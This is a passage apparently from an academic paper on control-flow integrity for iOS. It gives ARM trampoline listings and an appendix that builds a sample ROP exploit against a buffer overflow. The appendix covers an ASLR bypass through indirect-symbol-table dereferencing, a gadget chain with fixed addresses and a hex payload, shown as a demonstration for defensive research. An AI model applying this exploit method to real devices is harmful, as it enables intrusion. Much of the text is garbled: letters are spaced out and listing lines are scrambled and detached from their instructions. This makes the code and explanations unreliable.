/ / b l x r 1
s t r
/ /
ldmfd sp ! ,{ r0−r12 , l r }
/ /
/ / mov l r , pc
l d r pc , [ sp ,# −60];
/ /
/ / push { r0 , r1 , r2 , r 3}
/ /
/ / b l x r 1
/ / mov l r , r 0
/ / pop { r0 , r1 , r2 , r 3}
/ / bx l r
/ / ∗ v a l i d a t i o n r o u t i n e
/ / ∗ g e t
r1 , [ pc , # 1 6 ]
l d r
l r
} ;
; −> v a l i d a t e
; −> g e t
l r
Listing 4. External Call Trampoline
3However, our validation routine correctly sets lr by changing the lr
value that is stored on the stack (because it has been pushed by the second
instruction of the THUMB trampoline).
ul ong I n t e r n a l C a l l T r a m p o l i n e [ ] = {
0 x e 9 2 d 5 f f f ,
0 xe1a0000d ,
0 xe59f100c ,
0 x e 1 2 f f f 3 1 ,
0 xe50d0004 ,
0 x e 8 b d 5 f f f ,
0 xe51df03c ,
0 x00000000 ,
s tmf d
/ /
/ / mov
/ /
l d r
/ / b l x
s t r
/ /
/ /
ldmfd
/ /
l d r
/ / ∗ v a l i d a t i o n r o u t i n e
sp ! ,{ r0−r12 , l r }
r0 ,
r1 ,
r 1
r0 ,
sp ! , { r0−r12 , l r }
pc ,
sp
[ pc , # 1 2 ]
[ sp ,#−4]
[ sp ,#−60]
} ;
Listing 5. Internal Call Trampoline
The start of both trampolines is similar to the aforemen-
tioned custom trampolines: storing all registers, loading the
required parameters, and the ﬁnal call to the validation rou-
tine. Our validation routines for direct calls save the return
address, check the parameters for Objective C msgSend
calls, and ﬁnally provide the original branch target in r0.
This value is stored on the stack, and after resetting all reg-
isters, loaded into pc. As mentioned in Section 6 calls to
external (shared libraries) require in our current implemen-
tation speciﬁc handling: we store the return address on an
external shadow stack and change lr so that it points to our
trampoline. Hence, when the external function returns, it
returns to our trampoline, where we invoke the get lr to re-
trieve the original return address. Note that the get lr func-
tion is also invoked when an external library function re-
turns that has been originally invoked via an indirect call.
Therefore our validation for indirect calls checks whether
the branch target resides in the same code segment or tar-
gets a library function. For the latter one we change lr in
such a way that get lr is invoked after the library function
returns.
B. Control-Flow Attacks Against iOS
In the following we describe how we constructed a sam-
ple iOS exploit that circumvents memory randomization
and let the device beep and vibrate.
The vulnerable program is realized as follows:
FILE ∗ s F i l e ;
void foo ( char ∗ path ,
f i l e l e n g t h ) {
char buf [ 8 ] ;
s F i l e = fo pe n ( path ,
f g e t s ( buf ,
f c l o s e ( s F i l e ) ;
‘ ‘ r ’ ’ ) ;
f i l e l e n g t h ,
s F i l e ) ;
}
The shown foo() function simply opens a ﬁle, where the ﬁle
path and length are provided as parameters to the function.
Further, via fgets() it reads as many characters as speciﬁed
by the file_length parameter, and ﬁnally copies them
into the local buffer buf. However, fgets() does not check
the bounds of the buffer buf. This in turn allows an ad-
versary to divert the control-ﬂow by overﬂowing the buffer.
This can be achieved by providing a ﬁle which length’s ex-
ceeds the buffer’s size (here more than 8 Bytes). Hence,
the adversary can overwrite the return address of foo(),
and inject a ROP payload on the stack. In particular, our
constructed ROP gadget chain invokes (1) AudioServices-
PlaySystemSound(0x3ea) to play a sound and vibrate the
phone, and (2) exit(0) to close the application. However,
our ROP exploit will only succeed if it bypasses ASLR.
Bypassing ASLR on iOS.
iOS offers two levels of ASLR
protection [48]:
(1) full ASLR, and (2) ASLR only for
shared libraries and the program heap. The former one ran-
domizes each code and data segment of the program. On
the other hand, it can only be applied to applications that are
compiled as position independent executables (PIE). While
built-in applications such as the Safari Browser are com-
piled as PIEs, third-party applications typically do not sup-
port PIE [48]. Hence, for these applications, iOS only ran-
domizes the base addresses of shared libraries, but omits
the randomization of the program binary, and dynamic areas
such as the stack. Moreover, the iOS linker dyld is always
loaded at a ﬁxed location. In the following, we focus on
applications that do not support PIE. Nevertheless, control-
ﬂow attacks can be also launched against PIE applications,
if an adversary ﬁnds and exploits a memory disclosure vul-
nerability.
Our target function AudioServicesPlaySystemSound() is
from the AudioToolbox library that iOS randomizes af-
ter each device boot for PIE and non-PIE applications. We
successfully adopted GOT dereferencing and GOT over-
writing [22] techniques which have been recently deployed
on Intel x86 (Linux) to resolve an absolute address of a
function the adversary wants to execute. In the following,
we brieﬂy describe how principles of GOT dereferencing
can be applied to ARM and iOS.
GOT dereferencing exploits a common data leakage
problem of the Global Offset Table (GOT). Typically, the
GOT contains references to library function addresses the
program aims to use.
iOS uses a very similar data struc-
ture called indirect symbol table. By dereferencing a single
entry of the indirect symbol table, we can obtain an abso-
lute (i.e., runtime) address of a function, which in turn al-
lows us to calculate the randomization offset by subtracting
the static address of the same function. For our speciﬁc at-
tack, we read the absolute address of fgets() and subtract
its static address. We store the calculated offset value into
the indirect symbol table entry for fgets(), from where it
can be loaded each time the offset is needed. We calculate
the absolute address of AudioServicesPlaySystemSound()
by adding the randomization offset to the static address of
this function, and redirect the control-ﬂow to the computed
address. Note that we use the non-randomized code base of
the static dyld library to compute the randomization offset
and to resolve absolute addresses of functions (or instruc-
tion sequences) from randomized libraries.
Payload and Instruction Sequences. To construct our
malicious program, we leverage six different instruction se-
quences, while several of them are used more than once.
The execution order of the instructions sequences is shown
in Listing 6.
0 x2fe16a66 :
0 x 2 f e 1 6 a 6 a : add sp , #12
0 x 2 f e 1 6 a 6 c : bx l r
0 x2fe06528 : pop { r1 , r3 , r5 , r7 , pc}
0 x 2 f e 1 e 4 c 8 : pop { r0 , r4 , r5 , r7 , pc}
ldma sp ! , { r7 ,
l r }
l d r
[ r1 , #0]
r1 ,
r0 , r0 , r 1
0 x 2 f e 0 e f c 2 :
0 x 2 f e 0 e f c 4 : adds
0 x 2 f e 0 e f c 6 : bx l r
0 x2fe06528 : pop { r1 , r3 , r5 , r7 , pc}
s t r
r0 ,
[ r1 , #20]
0 x 2 f e 0 f 0 e 4 :
0 x 2 f e 0 f 0 e 6 : bx l r
0 x2fe06528 : pop { r1 , r3 , r5 , r7 , pc}
0 x 2 f e 1 e 4 c 8 : pop { r0 , r4 , r5 , r7 , pc}
l d r
[ r1 , #0]
r1 ,
r0 , r0 , r 1
0 x 2 f e 0 e f c 2 :
0 x 2 f e 0 e f c 4 : adds
0 x 2 f e 0 e f c 6 : bx l r
0 x2fe06528 : pop { r1 , r3 , r5 , r7 , pc}
r 0
0 x 2 f e 0 e c 4 0 : mov r12 ,
0 x 2 f e 0 e c 4 4 : pop { r0 , r1 , r2 , r3 , r7 , l r }
0 x 2 f e 0 e c 4 8 : add sp ,
0 x 2 f e 0 e c 4 c : bx r12
0 x 2 f e 1 e 4 c 8 : pop { r0 , r4 , r5 , r7 , pc}
sp , #8
Listing 6. Instruction Sequences
00 00: 41 41 41 41
000C : 67 ba e1 2 f
00 18: 41 41 41 41
00 24: 10 30 00 00
00 30: 30 30 30 30
003C : 41 41 41 41
00 48: c3 e f e0 2 f
00 54: 41 41 41 41
00 60: 10 30 00 00
006C : 30 30 30 30
00 78: 41 41 41 41
00 84: c3 e f e0 2 f
00 90: 41 41 41 41
009C : ea 03 00 00
00A8 : 41 41 41 41
00B4 : 30 30 30 30
00C0 : 41 41 41 41
00CC: dc 2 f 00 00
41 41 41 41
30 30 30 30
41 41 41 41
41 41 41 41
c8 e4 e1 2 f
41 41 41 41
f c 2 f 00 00
30 30 30 30
41 41 41 41
c8 e4 e1 2 f
41 41 41 41
41 41 41 41
30 30 30 30
41 41 41 41
30 30 30 30
41 41 41 41
41 41 41 41
30 30 30 30
30 30 30 30
29 65 e0 2 f
41 41 41 41
41 41 41 41
1 f 61 0 c cc
30 30 30 30
41 41 41 41
e5 f 0 e0 2 f
41 41 41 41
cd ca 8 a 33
30 30 30 30
41 41 41 41
40 ec e0 2 f
41 41 41 41
c8 e4 e1 2 f
00 00 00 00
30 30 30 30
Listing 7. Payload
Our payload is shown in Listing 7. The ﬁrst two words
of the payload ﬁll the buffer buf. The next two words
are popped from the stack into r7 and pc upon return of
foo(). Speciﬁcally, our exploit overwrites the return ad-
dress with 0x2fe16a67 to redirect execution to the ﬁrst
instruction sequence. The following ﬁve addresses point to
the subsequent sequences: 0x2fe06529, 0x2fe1e4c8,
0x2fe0efc3, 0x2fe0f0e5, and 0x2fe0ec40. Note
that code sequences compiled in THUMB mode have to be
addressed by an odd value (+1).
Further,
The address 0x33a8cacd is the static address of
AudioServicesPlaySystemSound().
the address
0x3010 points to the absolute address of fgets() stored in
the indirect symbol table of the vulnerable program. The
value 0xcc0c611f is an inversion of the static address
of fgets() 0x33f39ee0. 0x03ea and 0x00 are parame-
ters for the functions AudioServicesPlaySystemSound() and
exit(), respectively. Finally, 0x2fdc is the address of the
indirect symbol table entry of exit(). We use 0x41414141
and 0x30303030 as pattern bytes to compensate the side
effects of our invoked sequences.